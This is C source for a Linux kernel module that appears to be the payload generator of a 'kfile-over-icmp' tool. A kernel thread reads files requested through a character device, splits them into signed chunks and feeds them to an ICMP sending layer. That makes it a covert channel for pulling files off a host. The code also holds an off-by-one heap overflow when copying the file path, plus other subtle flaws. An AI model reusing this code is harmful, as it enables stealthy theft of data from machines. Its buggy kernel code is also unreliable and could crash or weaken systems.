#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#include "payload_generator.h"
#include "file_metadata.h"
#include "../chrdev/chrdev.h"

LIST_HEAD(g_chunk_list);
DEFINE_SPINLOCK(g_chunk_list_spinlock);

struct task_struct* g_payload_generator_thread;
unsigned int g_payload_generator_thread_stop = 0;

static const char* payload_generator_thread_name = "kgpayload";
static struct file_metadata current_file;

int read_file_thread_func(void* data);

void initialize_file_metadata(struct file_metadata *current_file)
{
    current_file->file_path = NULL;
}

void read_file_chunks(struct file_metadata *current_file)
{
    // open the file from user-space.
    struct file *filp;
    filp = filp_open(current_file->file_path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        printk(KERN_ERR "kfile-over-icmp: failed to open file. error: %ld\n", PTR_ERR(filp));
        return;
    }
    
    // get the file size
    loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
    loff_t current_position = vfs_llseek(filp, 0, 0);
    if (0 != current_position) {
        printk(KERN_ERR "kfile-over-icmp: failed to seek back to file's beginning. file path: %s\n", current_file->file_path);
        goto cleanup;
    }

    bool is_first_chunk = true;
    while (current_position < file_size) {
        struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_ATOMIC);
        if (NULL == new_chunk) {
            goto cleanup;
        }

        new_chunk->data = (char *)kmalloc(get_default_payload_chunk_size(), GFP_ATOMIC);
        if (NULL == new_chunk->data) {
            kfree(new_chunk);
            goto cleanup;
        }

        new_chunk->chunk_size = 0;

        size_t offset_in_buffer = 0;  // will include the signature if it is the first chunk.
        size_t available_space_in_chunk = get_default_payload_chunk_size();

        if (is_first_chunk) {
            // if it is the first chunk, we want to add a signature to it.
            struct new_file_signature signature;
            signature.file_size = file_size;
            memcpy(signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));

            memcpy(new_chunk->data, &signature, sizeof(struct new_file_signature));

            new_chunk->chunk_size += sizeof(struct new_file_signature);
            offset_in_buffer += sizeof(struct new_file_signature);
            available_space_in_chunk -= sizeof(struct new_file_signature);
            is_first_chunk = false;
        }

        ssize_t size_to_read = min(available_space_in_chunk, (size_t)(file_size - current_position));

        // read the file's content.
        // few important notes:
        //      1. traditionally, the common way of reading files in the kernel is by using VFS functions 
        //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. in newer kernel
        //         versions, the functions kernel_read and kernel_write were introduced, replacing the "old" 
        //         vfs_XXX functions. using kernel_read and kernel_write is considered a good practice as it 
        //         eliminates the need of messing with the FS (explained in 2). however, and from a very 
        //         mysterious reason, kernel_read didn't work here - hence vfs_read is used.
        //      2. vfs_read expects to save the read data into a user-space buffer. in order to pass a 
        //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. by setting the
        //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. note that
        //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
        //         will be caused.
        mm_segment_t security_old_fs = get_fs();
        set_fs(get_ds());
        ssize_t size_read = vfs_read(filp, new_chunk->data + offset_in_buffer, size_to_read, &current_position);
        set_fs(security_old_fs);

        // update the chunk list and add it to the list
        new_chunk->chunk_size += size_read;

        unsigned long flags;
        spin_lock_irqsave(&g_chunk_list_spinlock, flags);
        list_add_tail(&(new_chunk->l_head), &g_chunk_list);
        spin_unlock_irqrestore(&g_chunk_list_spinlock, flags);
    }

cleanup:
    filp_close(filp, NULL);
}

void process_next_pending_file(struct file_metadata *current_file)
{
    initialize_file_metadata(current_file);
    
    // check if there are pending files. if there isn't - return;
    mutex_lock(&g_requestd_files_list_mutex);
    bool is_list_empty = list_empty(&g_requestd_files_list);
    mutex_unlock(&g_requestd_files_list_mutex);

    if (is_list_empty) {
        return;    
    }

    // free the previous file path as we are going to process the next one.
    if (NULL != current_file->file_path) {
        printk(KERN_DEBUG "kfile-over-icmp: successfully send file %pn\n", current_file->file_path);
        kfree(current_file->file_path);
    }

    // acquire g_pending_files_to_be_sent mutex as we don't want anyone to mess
    // with our list while we are reading its head.
    mutex_lock(&g_requestd_files_list_mutex);
    struct file_metadata *next_pending_file;
    next_pending_file = list_first_entry_or_null(&g_requestd_files_list, struct file_metadata, l_head);
    if (NULL == next_pending_file) {
        goto release_mutex;
    }
    mutex_unlock(&g_requestd_files_list_mutex);

    // copy the file path
    size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
    current_file->file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
    if (NULL == current_file->file_path) {
        // if we fail to allocate space for the file path - we do not want to remove it from
        // the list so we will be able to reach it in the next time. if we'll delete it right 
        // now - then the file won't be sent.
        return;
    }
    memcpy(current_file->file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
    current_file->file_path[next_pending_file_path_length] = 0x00;

    // remove the item from the list of pending files.
    // also, free it as we are responsible for its memory.
    mutex_lock(&g_requestd_files_list_mutex);
    list_del(&next_pending_file->l_head);
    mutex_unlock(&g_requestd_files_list_mutex);

    kfree(next_pending_file->file_path);
    kfree(next_pending_file);

    // TODO: support saving only X chunks (for dealing with large files)
    // no need to acquire chunks_list_mutex as read_file_chunks does that internally.
    read_file_chunks(current_file);

    return;

release_mutex:
    mutex_unlock(&g_requestd_files_list_mutex);
}

int generate_payload(char *buffer, size_t *length)
{
    if (NULL == buffer) {
        return -EINVAL;
    }

    // try to acquire the chunks list lock.
    // we are using mutex_trylock and not spin_lock to prevent latency in the ICMP communication.
    // if we succeeded to acquire the lock - send any available chunks.
    unsigned int flags;
    if (!spin_trylock_irqsave(&g_chunk_list_spinlock, flags)) {
        return -EIO;
    }

    // NOTE: from now on we hold the lock! avoid from doing unnecessary stuff.

    if (list_empty(&g_chunk_list)) {
        // no avilable chunks to send.
        goto error_and_spinlock_release;
    }

    // there are chunks to send. 
    // read the first chunk, remove it from the list and return it to the caller.   
    struct file_chunk *next_chunk;
    next_chunk = list_first_entry_or_null(&g_chunk_list, struct file_chunk, l_head);
    if (NULL == next_chunk) {
        goto error_and_spinlock_release;
    }

    // copy the chunk's data to the caller's buffer.
    memcpy(buffer, next_chunk->data, next_chunk->chunk_size);
    *length = next_chunk->chunk_size;

    list_del(&(next_chunk->l_head));
    kfree(next_chunk->data);
    kfree(next_chunk);

error_and_spinlock_release:
    spin_unlock_irqrestore(&g_chunk_list_spinlock, flags);
    return 0;
}

int read_file_thread_func(void* data)
{
    while (!g_payload_generator_thread_stop) {
        // no need to use locks as process_next_pending_file does that internally.
        process_next_pending_file(&current_file);
        // TODO: replace with completion variable later on.
        msleep(3000);
    }

    return 0;
}

int start_payload_generator_thread(void)
{
    g_get_payload_func = &generate_payload;
    initialize_file_metadata(&current_file);
    g_payload_generator_thread = kthread_run(read_file_thread_func, NULL, payload_generator_thread_name);
    if (!g_payload_generator_thread) {
        return -EINVAL;
    }

    get_task_struct(g_payload_generator_thread);

    return 0;
}

void stop_payload_generator_thread(void)
{
    g_payload_generator_thread_stop = 1;
    kthread_stop(g_payload_generator_thread);
    put_task_struct(g_payload_generator_thread);    
}

size_t get_default_payload_chunk_size(void)
{
    // TODO: check if less then the size of struct signature
    return DEFAULT_PAYLOAD_CHUNKS_SIZE;
}